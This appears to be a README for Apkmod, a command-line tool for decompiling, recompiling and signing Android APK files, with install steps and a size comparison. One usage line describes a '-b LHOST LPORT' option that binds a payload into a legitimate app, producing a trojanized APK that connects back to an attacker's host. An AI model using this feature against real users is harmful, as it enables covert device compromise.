# Apkmod v1.0
### Author : Lokesh @Hax4us

## _Steps For Installation_
1. First goto home directory `cd $HOME`
2. Get the setup script `wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh`
3. Execute the script `sh setup.sh`
4. Now you can execute command `apkmod`

## Usage :
1. For decompiling `apkmod -d /path/to/inapp.apk /path/to/outdirectory`. It will decompile __inapp.apk__ into __outdirectory__ folder.
2. For recompiling `apkmod -r /path/to/indirectory /path/to/outapp.apk`. It will recompile __indirectory__ ( where decompiled files are exists ) into __outapp.apk__.
3. For signing `apkmod -s /path/to/unsignedapp.apk /path/to/signedapp.apk`. It will sign __unsignedapp.apk__ and saves output ( signed app ) to __signedapp.apk__.
4. For binding `apkmod -b LHOST LPORT /path/to/originalApp.apk /path/to/binded.apk`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk`

### Size Comparision
Size  | Apkmod  | Third party tools
--- | --- | ---
after installation | Around 100 MB | Around 700-900 MB

#### Why Apkmod is extremely small ?
Because it has Alpine instead of Ubuntu, kali, parrot or other glibc based distros.
